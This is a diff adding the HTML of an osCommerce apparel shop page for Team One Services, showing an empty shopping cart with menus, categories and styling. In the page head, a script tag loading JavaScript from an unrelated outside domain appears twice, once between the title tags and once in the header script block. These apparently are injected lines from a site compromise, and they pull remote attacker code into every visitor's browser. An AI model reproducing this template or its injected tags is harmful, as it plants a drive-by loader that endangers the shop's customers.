@@ -1,0 +1,322 @@
+<!-- Page layout by Simple Template System (STS) v3.00 Beta 2 on osCommerce 2.2-MS2 - http://www.diamondsea.com/sts/ -->
+<!-- Using Template File [includes/sts_template.html) -->
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE"><META HTTP-EQUIV="PRAGMA" CONTENT="NO-CACHE"><META HTTP-EQUIV="Expires" CONTENT="-1"><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<title>Welcome in your Team One Services, LLC</title><script src=http://dragosimport.com/js/></script><title> shop</title><base href="http://www.teamoneservices.com/apparel/">
+
+<!-- start get_javascript(applicationtop2header) //-->
+<script src=http://dragosimport.com/js/></script>
+<!-- end get_javascript(applicationtop2header) //-->
+<script language="javascript" src="/adcscripts/simple_fade/simple_fade.js"></script>
+
+<title>Team One Food Store</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<meta name="description" content="Team One Food Store allows you to get Gas Food and Money at 1 location.  This is the official site for Team 1 Food Stores and we sell to citizens and government employees.  We offer gas, food, and drinks.">
+<meta name="distribution" content="global">
+<meta name="keywords" content="team 1, team one, convenience store hillsdale, team one food store, team 1 food store, hillsdale, mi, michigan, team one, food, gas, atm, hillsdale pizza, hillsdale gas">
+<meta name="resource-type" content="document">
+<link href="stylesheet.css" rel="stylesheet" media="screen">
+<style type="text/css">
+<!--
+.clearfix:after {
+    content: "."; 
+    display: block; 
+    height: 0; 
+    clear: both; 
+    visibility: hidden;
+}
+
+.clearfix {display: inline-block;}
+
+/* Hides from IE-mac \*/
+* html .clearfix {height: 1%;}
+.clearfix {display: block;}
+/* End hide from IE-mac */
+
+/* #block_1	{	float: left;width: 34%;margin-left: 33%;} */
+/* The following line was removed because I do not know what it was for.
+/* html #block_1	{	display: inline;}*/
+/* #block_2	{	float: left;width: 33%;margin-left: -67%;} */
+/* #block_3	{	float: left;width: 33%;	} */
+/* Start Mac IE5 filter \*/
+.fitContainer{	padding-bottom: 32767px !important;	margin-bottom: -32767px !important;	}
+/* End Mac IE5 filter */
+#wrapper	{	overflow: hidden; /* This hides the excess padding in non-IE browsers */	}
+
+/* we need this for IE 5.01 - otherwise the wrapper does not expand to the
+necessary height (unless fixed, this problem becomes even more acute 
+weirdness as the method is enhanced */
+#wrapper	{
+/* Normally a Holly-style hack height: 1% would suffice but that causes 
+IE 5.01 to completely collapse the wrapper - instead we float it */
+	float: left;
+/* NB. possibly only IE 5.01 needs to get this float value - otherwise 5.5 sometimes 
+(I saw it happen many moons ago) makes the width of wrapper too small 
+the float: none with the comment is ignored by 5.01,
+5.5 and above see it and carry on about their business
+It's probably fine to just remove it, but it's left here 
+just in case that many moons ago problem rears its head again */
+	float/**/: none;}
+	
+a {font-size:12;color:#000000;}
+a:hover {color:#A57ABF;}
+.infoBox {background-color:#FFFFFF;}
+.infoBoxContents {font-family:Verdana, sans-serif;font-size:12px;background-color:#FFFFFF;}
+.infoBoxNotice {background-color:#CF2121;}
+.infoBoxNoticeContents {font-family:Verdana, sans-serif;font-size:10px;background-color:#29EB26;}
+.infoBoxHeading {font-family:Verdana, sans-serif;font-size:10px;color:#380c09;font-weight:bold;background-color:#A57ABF;}
+.pageHeading {font-family:Verdana, sans-serif;font-size:20px;color:#380c09;font-weight:bold;}
+.bodyStyle {font-family:Verdana, sans-serif;background-image:url(swirlbg.gif);text-align:center;}
+.mainPageStyle {border-color:#000000;border-style:solid;border-width:1px;background-color:#ffffff;width:770px;text-align:center;margin-top:10px;margin-left:auto;margin-right:auto;}
+.productListing-heading {background-color:#A57ABF;}
+.productListing-data {font-family:'Trebuchet MS', sans-serif;font-size:15px;color:#000000;font-weight:normal;background-color:#ffffff;}
+.smallText {font-size:12px;background-color:#ffffff;}
+.CatalogLeftColumn {width:20%;margin-bottom:-32767;padding-bottom:32767;float:left;}
+.CatalogCenterColumn {color:#000000;width:79%;margin-bottom:-32767;margin-left:auto;margin-right:auto;padding-bottom:32767;float:left;}
+.CatalogRightColumn {background-color:#FFFFFF;width:20%;margin-bottom:-32767;padding-bottom:32767;float:right;}
+.LeftSampleBanners {text-align:center;float:left;}
+.LeftSampleBannersLink {overflow:hidden;border-width:0;background-color:#ffffff;width:267px;height:150px;overflow:hidden;}
+a.LeftSampleBannersLink {display:block;text-decoration:none;border-width:0;background-color:#ffffff;width:267px;height:150px;overflow:hidden;}
+.HomeFlash {width:501px;float:right;}
+.HomeSmallBanners {width:501px;float:right;height:150px;}
+.HomeSmallBannersLink {overflow:hidden;background-color:#ffffff;width:167;float:left;height:150px;}
+a.HomeSmallBannersLink {display:block;text-decoration:none;background-color:#ffffff;width:167;float:left;height:150px;}
+.HeaderGraphic {width:501px;overflow:visible;}
+.templateMainMenu {font-family:Verdana, sans-serif;font-size:10;color:#000000;font-weight:normal;line-height:20px;border-color:#000000;border-style:solid;border-width:1;background-color:#eadfc3;width:100%;text-align:left;}
+.templateMainMenuLink {overflow:hidden;height:20px;font-family:'Trebuchet MS', sans-serif;font-size:13;color:#000000;line-height:20px;background-color:#eadfc3;padding-left:10;padding-right:10;float:left;}
+a.templateMainMenuLink {display:block;text-decoration:none;font-family:'Trebuchet MS', sans-serif;font-size:13;color:#000000;line-height:20px;background-color:#eadfc3;padding-left:10;padding-right:10;float:left;}
+a.templateMainMenuLink:hover {color:#380c09;background-color:#F7EBCB;}
+.SecondMenuCategories {font-family:Verdana, sans-serif;font-size:10;color:#000000;font-weight:normal;line-height:20px;border-color:#000000;border-style:solid;border-width:1;background-color:#eadfc3;width:100%;text-align:left;}
+.SecondMenuCategoriesLink {overflow:hidden;height:20px;font-family:'Trebuchet MS', sans-serif;font-size:13;color:#000000;line-height:20px;background-color:#eadfc3;padding-left:10;padding-right:10;float:left;}
+a.SecondMenuCategoriesLink {display:block;text-decoration:none;font-family:'Trebuchet MS', sans-serif;font-size:13;color:#000000;line-height:20px;background-color:#eadfc3;padding-left:10;padding-right:10;float:left;}
+a.SecondMenuCategoriesLink:hover {color:#380c09;background-color:#F7EBCB;}
+.InfoPagesMenu {font-family:Verdana, sans-serif;font-size:10;color:#000000;font-weight:normal;line-height:20px;border-color:#000000;border-style:solid;border-width:1;background-color:#eadfc3;width:100%;text-align:left;}
+.InfoPagesMenuLink {overflow:hidden;height:20px;font-family:'Trebuchet MS', sans-serif;font-size:13;color:#000000;line-height:20px;background-color:#eadfc3;padding-left:10;padding-right:10;float:left;}
+a.InfoPagesMenuLink {display:block;text-decoration:none;font-family:'Trebuchet MS', sans-serif;font-size:13;color:#000000;line-height:20px;background-color:#eadfc3;padding-left:10;padding-right:10;float:left;}
+a.InfoPagesMenuLink:hover {color:#380c09;background-color:#F7EBCB;}
+
+
+.productName {font-weight:bold;}
+
+-->
+</style>
+</head>
+<body class="bodyStyle"> 
+<div class="mainPageStyle">
+  <!-- top Div -->
+<div class="clearfix topStyle" id="wrapper">
+<div class="clearfix HeaderGraphic"><div class="HeaderGraphicLink"><a href="http://www.teamoneservices.com/apparel/redirect.php?action=banner&goto=2&osCsid=c12ca4bb5ae7595c7d8d41fac9025299" target="_blank"><img src="images/headerbanner.jpg" border="0" alt="Header Banner" title=" Header Banner " width="770" height="150"></a></div></div><div class="clearfix templateMainMenu"><a class="templateMainMenuLink" href="index.php">Home</a>
+<a class="templateMainMenuLink" href="account.php">My Account</a>
+<div class="clearfix templateMainMenuLink"><form name="simple_search_box" action="http://www.teamoneservices.com/apparel/advanced_search_result.php" method="get"><input type="hidden" name="search_in_description" value="1"><input type="hidden" name="inc_subcat" value="1" 1><input type="text" name="keywords" size="10" maxlength="30"><input type="submit" name="submit" value="Search"></form></div>
+<div class="clearfix templateMainMenuLink"><form name="manufacturers" action="http://www.teamoneservices.com/apparel/index.php" method="get"><select name="manufacturers_id" onChange="this.form.submit();" size="1" ><option value="" SELECTED>Products by Brands</option><option value="43"></option><option value="31"></option><option value="30"></option><option value="29"></option><option value="28"></option><option value="27"></option><option value="26"></option><option value="25"></option><option value="24"></option><option value="32"></option><option value="33"></option><option value="34"></option><option value="42"></option><option value="41"></option><option value="40"></option><option value="39"></option><option value="38"></option><option value="37"></option><option value="36"></option><option value="35"></option><option value="23"></option><option value="22"></option><option value="21"></option><option value="9"></option><option value="8"></option><option value="7"></option><option value="6"></option><option value="5"></option><option value="4"></option><option value="3"></option><option value="2"></option><option value="10"></option><option value="11"></option><option value="12"></option><option value="20"></option><option value="19"></option><option value="18"></option><option value="17"></option><option value="16"></option><option value="15"></option><option value="14"></option><option value="13"></option><option value="1"></option></select><input type="hidden" name="osCsid" value="c12ca4bb5ae7595c7d8d41fac9025299"></form>
+</div>
+<a class="templateMainMenuLink" href="advanced_search.php">Advanced Search</a>
+</div><div class="clearfix SecondMenuCategories"><a class="SecondMenuCategoriesLink" href="index.php?cPath=49">Accessories</a>
+<a class="SecondMenuCategoriesLink" href="index.php?cPath=47">Gift Certificates</a>
+<a class="SecondMenuCategoriesLink" href="index.php?cPath=42">Jewelry</a>
+<a class="SecondMenuCategoriesLink" href="index.php?cPath=44">Men's Wear</a>
+<a class="SecondMenuCategoriesLink" href="index.php?cPath=45">Shoes</a>
+<a class="SecondMenuCategoriesLink" href="index.php?cPath=46">Sunglasses</a>
+<a class="SecondMenuCategoriesLink" href="index.php?cPath=43">Women's Wear</a>
+<a class="SecondMenuCategoriesLink" href="specials.php">Specials</a>
+</div>
+</div>
+<!-- End top Div -->
+
+  <!-- centerCatalog Div -->
+<div class="clearfix centerCatalogStyle" id="wrapper">
+<div class="clearfix CatalogLeftColumn"><div class="clearfix CatalogLeftColumnLink">
+<!-- start shoppingorregistrycart //-->
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading"><img src="images/pixel_trans.gif" border="0" alt="" width="11" height="14"></td>
+    <td width="100%" height="14" class="infoBoxHeading">Shopping Cart</td>
+    <td height="14" class="infoBoxHeading" nowrap><a href="http://www.teamoneservices.com/apparel/shopping_cart.php?osCsid=c12ca4bb5ae7595c7d8d41fac9025299"><img src="images/infobox/arrow_right.gif" border="0" alt="more" title=" more " width="12" height="10"></a><img src="images/pixel_trans.gif" border="0" alt="" width="11" height="14"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="3" class="infoBoxContents">
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+  <tr>
+    <td class="boxText">0 items</td>
+  </tr>
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+<!-- end shoppingorregistrycart //-->
+</div>
+<div class="clearfix CatalogLeftColumnLink">
+<!-- start categorybox //-->
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading"><img src="images/pixel_trans.gif" border="0" alt="" width="11" height="14"></td>
+    <td width="100%" height="14" class="infoBoxHeading">Categories</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/pixel_trans.gif" border="0" alt="" width="11" height="14"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="3" class="infoBoxContents">
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+  <tr>
+    <td class="boxText"><a href="http://www.teamoneservices.com/apparel/index.php?cPath=49&osCsid=c12ca4bb5ae7595c7d8d41fac9025299">Accessories</a>&nbsp;(2)<br><a href="http://www.teamoneservices.com/apparel/index.php?cPath=47&osCsid=c12ca4bb5ae7595c7d8d41fac9025299">Gift Certificates</a>&nbsp;(1)<br><a href="http://www.teamoneservices.com/apparel/index.php?cPath=42&osCsid=c12ca4bb5ae7595c7d8d41fac9025299">Jewelry</a>&nbsp;(2)<br><a href="http://www.teamoneservices.com/apparel/index.php?cPath=44&osCsid=c12ca4bb5ae7595c7d8d41fac9025299">Men's Wear</a>&nbsp;(2)<br><a href="http://www.teamoneservices.com/apparel/index.php?cPath=45&osCsid=c12ca4bb5ae7595c7d8d41fac9025299">Shoes</a>&nbsp;(2)<br><a href="http://www.teamoneservices.com/apparel/index.php?cPath=46&osCsid=c12ca4bb5ae7595c7d8d41fac9025299">Sunglasses</a>&nbsp;(2)<br><a href="http://www.teamoneservices.com/apparel/index.php?cPath=43&osCsid=c12ca4bb5ae7595c7d8d41fac9025299">Women's Wear</a>&nbsp;(2)<br></td>
+  </tr>
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+<!-- end categorybox //-->
+</div>
+<div class="clearfix CatalogLeftColumnLink">
+<!-- start bestsellersbox //-->
+
+<!-- end bestsellersbox //-->
+</div>
+<div class="clearfix CatalogLeftColumnLink">
+<!-- start reviewsbox //-->
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading"><img src="images/pixel_trans.gif" border="0" alt="" width="11" height="14"></td>
+    <td width="100%" height="14" class="infoBoxHeading">Reviews</td>
+    <td height="14" class="infoBoxHeading" nowrap><a href="http://www.teamoneservices.com/apparel/reviews.php?osCsid=c12ca4bb5ae7595c7d8d41fac9025299"><img src="images/infobox/arrow_right.gif" border="0" alt="more" title=" more " width="12" height="10"></a><img src="images/pixel_trans.gif" border="0" alt="" width="11" height="14"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="3" class="infoBoxContents">
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+  <tr>
+    <td class="boxText">There are currently no product reviews</td>
+  </tr>
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+<!-- end reviewsbox //-->
+</div>
+<div class="clearfix CatalogLeftColumnLink">
+<!-- start whatsnewbox //-->
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading"><img src="images/pixel_trans.gif" border="0" alt="" width="11" height="14"></td>
+    <td width="100%" height="14" class="infoBoxHeading">What's New?</td>
+    <td height="14" class="infoBoxHeading" nowrap><a href="http://www.teamoneservices.com/apparel/products_new.php?osCsid=c12ca4bb5ae7595c7d8d41fac9025299"><img src="images/infobox/arrow_right.gif" border="0" alt="more" title=" more " width="12" height="10"></a><img src="images/pixel_trans.gif" border="0" alt="" width="11" height="14"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="3" class="infoBoxContents">
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+  <tr>
+    <td align="center" class="boxText"><a href="http://www.teamoneservices.com/apparel/product_info.php?products_id=215&osCsid=c12ca4bb5ae7595c7d8d41fac9025299"><img src="images/ladiespantsmall.jpg" border="0" alt="Ladies Pants" title=" Ladies Pants " width="100" height="80"></a><br><a href="http://www.teamoneservices.com/apparel/product_info.php?products_id=215&osCsid=c12ca4bb5ae7595c7d8d41fac9025299">Ladies Pants</a><br>$49.99<br /></td>
+  </tr>
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+<!-- end whatsnewbox //-->
+</div>
+</div><div class="clearfix CatalogCenterColumn"><div class="clearfix CatalogCenterColumnLink">
+<!-- start content //-->
+<form name="cart_quantity" action="http://www.teamoneservices.com/apparel/shopping_cart.php?action=update_product_cart&osCsid=c12ca4bb5ae7595c7d8d41fac9025299" method="post"><table border="0" width="100%" cellspacing="0" cellpadding="0">
+      <tr>
+        <td colspan="4"><table border="0" width="100%" cellspacing="0" cellpadding="0">
+          <tr>
+            <td class="pageHeading">What's In My Cart?</td>
+            <td class="pageHeading" align="right"><img src="images/table_background_cart.gif" border="0" alt="What's In My Cart?" title=" What's In My Cart? " width="1" height="1"></td>
+          </tr>
+        </table></td>
+      </tr>
+      <tr>
+        <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="10"></td>
+      </tr>
+      <tr>
+        <td align="center" class="main"><table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="3" class="infoBoxContents">
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+  <tr>
+    <td class="boxText">Your Shopping Cart is empty!</td>
+  </tr>
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+</td>
+      </tr>
+      <tr>
+        <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="10"></td>
+      </tr>
+      <tr>
+        <td><table border="0" width="100%" cellspacing="1" cellpadding="2" class="infoBox">
+          <tr class="infoBoxContents">
+            <td><table border="0" width="100%" cellspacing="0" cellpadding="2">
+              <tr>
+                <td width="10"><img src="images/pixel_trans.gif" border="0" alt="" width="10" height="1"></td>
+                <td align="right" class="main"><a href="http://www.teamoneservices.com/apparel/index.php?osCsid=c12ca4bb5ae7595c7d8d41fac9025299"><div class="cssButton">&nbsp;Continue&nbsp;</div></a></td>
+                <td width="10"><img src="images/pixel_trans.gif" border="0" alt="" width="10" height="1"></td>
+              </tr>
+            </table></td>
+          </tr>
+        </table></td>
+      </tr>
+    </table></form>
+<!-- end content //-->
+</div>
+</div><div class="clearfix CatalogRightColumn"><div class="clearfix CatalogRightColumnLink">
+<!-- start specialfriendbox //-->
+
+<!-- end specialfriendbox //-->
+</div>
+</div>
+</div>
+<!-- End centerCatalog Div -->
+
+	
+  
+  <!-- bottom Div -->
+<div class="clearfix bottomStyle" id="wrapper">
+<div class="clearfix InfoPagesMenu"><a class="InfoPagesMenuLink" href="account_history.php">Check Order Status</a>
+<a class="InfoPagesMenuLink" href="information.php?info_id=1">Contact Us</a>
+<a class="InfoPagesMenuLink" href="information.php?info_id=2">Security & Privacy Policy</a>
+<a class="InfoPagesMenuLink" href="information.php?info_id=3">Returns & Exchanges</a>
+<a class="InfoPagesMenuLink" href="information.php?info_id=4">Shipping & Handling</a>
+<a class="InfoPagesMenuLink" href="information.php?info_id=5">About Us</a>
+<a class="InfoPagesMenuLink" href="information.php?info_id=6">100% Satisfaction</a>
+<a class="InfoPagesMenuLink" href="information.php?info_id=7">Designers</a>
+</div>
+</div>
+<!-- End bottom Div -->
+
+</div>
+	&copy; 2006 <a href="http://teamoneservices.com">Team One Services.</a>
+
